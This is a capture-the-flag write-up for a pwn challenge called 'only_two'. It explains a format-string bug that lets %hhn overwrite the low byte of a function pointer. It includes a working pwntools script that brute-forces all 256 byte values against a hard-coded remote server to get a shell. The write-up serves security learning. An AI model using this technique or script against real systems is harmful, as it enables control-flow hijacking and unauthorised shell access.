# Writeup - only_two

## 1. Challenge Overview

The remote binary provides a simple menu:

1.  **leak** -- prints the addresses of `onexit_hook` and `main`.
2.  **write** -- lets the player input a format string, which is passed
    to `printf(fmt, &onexit_hook)`.
3.  **go** -- calls `onexit_hook`.
4.  **quit**.

Key behavior: - The first time you call **go**, the program sets
`onexit_hook = safe`. - After that, you can use **write** with a format
string to overwrite bytes at the address of `onexit_hook`. - The next
**go** will actually call whatever `onexit_hook` points to.

Goal: redirect `onexit_hook` so that instead of calling `safe()`, it
executes a shell (e.g. `system("/bin/sh")` or a suitable gadget).

------------------------------------------------------------------------

## 2. Exploitation Idea

-   The only practical primitive here is `%hhn`, which writes **one
    byte**.
-   Writing a full address is impossible --- but we only need to modify
    the **least significant byte (LSB)** of `onexit_hook`.
-   If the LSB happens to align with a gadget or `system()`, we can
    hijack control flow.
-   Therefore, the approach is to brute-force all 256 possible LSB
    values until one of them gives a working shell.

------------------------------------------------------------------------

## 3. Exploit Script

Here's the Python exploit using pwntools:

``` python
#!/usr/bin/env python3
from pwn import *

HOST = "8.216.34.114"
PORT = 18882
context.log_level = "info"

def run_try(lsb):
    r = remote(HOST, PORT)

    # 1) go() -> init onexit_hook = safe
    r.recvuntil(b"> ")
    r.sendline(b"3")
    r.recvuntil(b"bye")

    # 2) leak() -> debug info
    r.recvuntil(b"> ")
    r.sendline(b"1")
    leak_line = r.recvlineS().strip()
    log.debug(leak_line)

    # 3) write() -> overwrite LSB of onexit_hook
    r.recvuntil(b"> ")
    r.sendline(b"2")
    fmt = b"A" * lsb + b"%1$hhn"
    r.send(fmt + b"\n")

    # 4) go() -> trigger onexit_hook
    r.recvuntil(b"> ")
    r.sendline(b"3")

    # 5) check if we got a shell
    try:
        r.sendline(b"echo PWNED")
        out = r.recvline(timeout=0.5)
        if out and b"PWNED" in out:
            log.success(f"Got shell with LSB={lsb:#x}")
            r.interactive()
            return True
    except EOFError:
        pass

    r.close()
    return False

def main():
    for lsb in range(256):
        log.info(f"Trying LSB={lsb:#x}")
        if run_try(lsb):
            return
    log.failure("No valid LSB found!")

if __name__ == "__main__":
    main()
```
